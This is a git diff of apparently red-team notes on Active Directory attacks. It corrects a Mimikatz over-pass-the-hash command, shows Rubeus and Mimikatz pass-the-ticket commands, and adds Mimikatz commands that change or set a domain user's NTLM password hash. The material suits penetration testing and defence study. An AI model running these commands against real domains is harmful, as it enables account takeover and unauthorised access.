@@ -118,7 +118,7 @@ Abusing kerberos functionality we can execute commands as another user by only k
 * Invoke-Mimikatz
 
 ```powershell
-Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /ntlm:<ntlmhash> /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<ntlmhash> /run:powershell.exe"'
 ```
 
 > **RedTeam Note**: There is a different in encryption type for timestamp between a normal `krb-as-req` and one using the Over-Pass-the-hash `krb-as-req`
@@ -153,3 +153,17 @@ Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
 .\Rubeus.exe ptt /ticket:ticket.kirbi
 .\Rubeus.exe ptt /ticket:<base64ticket>
 ```
+
+# Manipulating User Passwords with Mimikatz 
+
+Mimikatz supports the ability to manipulate user password, so we can change the password to a new one and restore it later.
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::changentlm /server:dc01 /user:jeff /old:<NTLM> /newpassword:<NTLM2>"'
+```
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::setntlm /server:dc01 /user:jeff /ntlm:<NTLM>"'
+```
+
+* [https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/](https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/)
